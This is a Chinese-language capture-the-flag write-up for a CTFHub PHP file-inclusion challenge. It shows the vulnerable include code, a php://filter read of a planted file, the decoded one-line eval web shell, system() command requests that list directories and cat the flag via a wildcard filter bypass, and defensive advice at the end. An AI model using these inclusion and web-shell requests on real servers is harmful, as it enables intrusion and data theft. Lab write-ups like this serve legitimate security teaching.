---
title: CTFHub RCE-文件包含
date: 2026-10-21
categories: CTFHub Web PHP 文件包含 php://filter伪协议 RCE 代码执行
tags: CTFHub Web PHP 文件包含 php://filter伪协议 RCE 代码执行
---
# 题目： CTFHub RCE-文件包含

## 题目描述
打开题目页面，直接给出了一段 PHP 源码：
```php
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET['file'], "flag")) {
        include $_GET['file'];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i have a <a href="shell.txt">shell</a>, how to use it ?
```
*分析：*
存在 include($_GET['file'])，存在任意文件包含漏洞。
使用 strpos 过滤了 flag 关键字，如果 URL 里包含 flag，会直接输出 Hacker!!!。
页面底部提示：服务器上有一个 shell.txt 文件。

## 解题思路
### 漏洞原理
文件包含漏洞允许攻击者包含服务器上的任意文件。如果包含的文件内容包含 PHP 代码，代码就会被执行。

### 攻击链
利用 php://filter 伪协议读取 shell.txt 的源码。
解密 Base64，发现其中包含木马代码：<?php eval($_REQUEST['ctfhub']);?>。
构造包含 shell.txt 的请求，并传入 ctfhub 参数执行命令。
利用系统命令搜索 flag（需绕过 flag 关键字）。

### 解题步骤
1. 利用伪协议读取 shell.txt 源码
因为直接访问或者包含 shell.txt 可能会显示源码，我们用 php://filter 将文件内容进行 Base64 编码后读取：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=php://filter/convert.base64-encode/resource=shell.txt
```
返回结果：
```text
PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0Zmh1YiddKTs/Pg==

2. Base64 解码获取木马
解码上面的 Base64 字符串，得到：
```
php
<?php eval($_REQUEST['ctfhub']);?>
```
发现木马参数名为 ctfhub。

3. 执行命令寻找 flag
因为源码拦截了 flag 关键字，我们需要用通配符 * 或 ? 来绕过。
测试执行：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('ls');
```
返回：index.php shell.txt

查看根目录：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('ls /');
```
返回：bin boot dev etc flag home ...（发现了根目录下的 flag）

4. 读取 Flag：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('cat /f*');
```
得到 flag:ctfhub{9337363af5e5e829b72e345c}

## 踩坑指南
1. 误以为参数名是 cmd
原因： 习惯性地用 ?cmd=ls，导致木马没执行。
解决： 通过 php://filter 读取 shell.txt 源码，发现真实的木马参数名是 ctfhub。

2. 直接 find 搜索满屏报错
原因： find / -name f* 会遍历 /proc 等系统目录，产生大量冗余信息。
解决： 先 ls / 看看根目录，或者用 find / -name f* 2>/dev/null 屏蔽报错。

3. flag 关键字被拦截
原因： 源码中 strpos 检测了 flag。
解决： 使用 Linux 通配符 cat /f* 或 cat /fla? 代替 cat /flag。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| 文件包含 | `include` / `require` 等函数包含文件并执行 |
| `php://filter` | 用于读取文件源码的伪协议，常配合 Base64 编码使用 |
| 通配符绕过 | 使用 `*`、`?` 等符号绕过关键字检测 |
| `eval()` | 执行 PHP 代码的函数 |

### 防御建议
1. 白名单限制：严格限制包含的文件名，只允许包含特定白名单内的文件。
2. 禁用危险伪协议：在 php.ini 中关闭 allow_url_include。
3. 过滤敏感字符：严格过滤 ../、php:// 等危险字符。
